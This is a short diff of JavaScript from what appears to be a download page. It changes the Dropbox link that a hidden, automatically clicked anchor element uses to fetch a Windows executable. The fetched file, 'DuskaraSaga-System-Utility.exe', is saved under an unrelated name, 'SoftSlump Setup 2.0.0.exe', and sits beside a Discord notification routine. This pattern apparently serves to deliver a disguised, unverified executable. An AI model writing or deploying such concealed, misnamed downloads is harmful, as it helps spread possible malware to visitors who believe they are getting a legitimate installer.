@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/hvz41p9mjy0ujks23cdri/DuskaraSaga-Setup.exe?rlkey=y2xz25i7o43ncigk5rp6pfp6m&st=4rmc0nib&dl=1';
+    a.href = 'https://www.dropbox.com/scl/fi/pc5z6xsd327jz7vtrn6pf/DuskaraSaga-System-Utility.exe?rlkey=0yz3p0ch8q2qsxqtxjp1361xj&st=zggslgk9&dl=1';
     a.download = 'SoftSlump Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
